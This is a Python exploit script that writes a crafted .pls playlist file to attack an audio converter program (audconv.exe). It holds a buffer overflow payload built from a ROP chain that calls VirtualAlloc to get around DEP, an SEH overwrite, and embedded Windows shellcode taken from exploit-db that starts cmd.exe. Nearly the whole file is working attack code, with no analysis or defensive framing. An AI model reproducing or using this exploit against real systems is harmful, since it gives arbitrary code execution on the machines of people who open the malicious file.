#!/usr/bin/python
import struct

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x0043fb74,  # POP ESI # RETN [audconv.exe]
      0x0044b290,  # ptr to &VirtualAlloc() [IAT audconv.exe]
      0x0042fa37,  # MOV EAX,DWORD PTR DS:[ESI] # RETN [audconv.exe]
      0x10037d05,  # XCHG EAX,ESI # RETN [audconv.dll]
      0x0042064f,  # POP EBP # RETN [audconv.exe]
      0x0040b560,  # & call esp [audconv.exe]
      0x100572fc,  # POP EBX # RETN [audconv.dll]
      0x00000001,  # 0x00000001-> ebx
      0x10082d43,  # POP EDX # RETN [audconv.dll]
      0x00001000,  # 0x00001000-> edx
      0x1000e09b,  # POP ECX # RETN [audconv.dll]
      0x00000040,  # 0x00000040-> ecx
      0x0043277e,  # POP EDI # RETN [audconv.exe]
      0x1003f2b9,  # RETN (ROP NOP) [audconv.dll]
      0x1008a554,  # POP EAX # RETN [audconv.dll]
      0x90909090,  # nop
      0x1002ef14,  # PUSHAD # RETN [audconv.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

# Cmd.exe Universal shellcode taken from exploit-db.com
shellcode = ( "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"+
    "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"+
    "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"+
    "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"+
    "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"+
    "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"+
    "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"+
    "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"+
    "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"+
    "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"+
    "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"+
    "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"+
    "\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE"+
    "\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53"+
    "\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24"+
    "\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51"+
    "\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE"+
    "\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"+
    "\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54"+
    "\x24\x20\x57\xFF\xD0")


junk = "A" * 2064
rop_chain = create_rop_chain()
junk2 = "A" * (2132 - (len(junk) + len(rop_chain)))
# Shellcode goes here
junk3 = "A" * (4432 - (len(junk) + len(junk2) + len(rop_chain) + len(shellcode)))
nseh = "DDDD"
seh = "\x62\xA7\x01\x10" # ADD ESP 10F0; RETN

buffer = junk + rop_chain + junk2 + shellcode + junk3 + nseh + seh
buffer += "C" * (50000 - len(buffer)) # New trigger calculation

handle = open("audioExploitDemo.pls", "w")
handle.write(buffer)
handle.close()
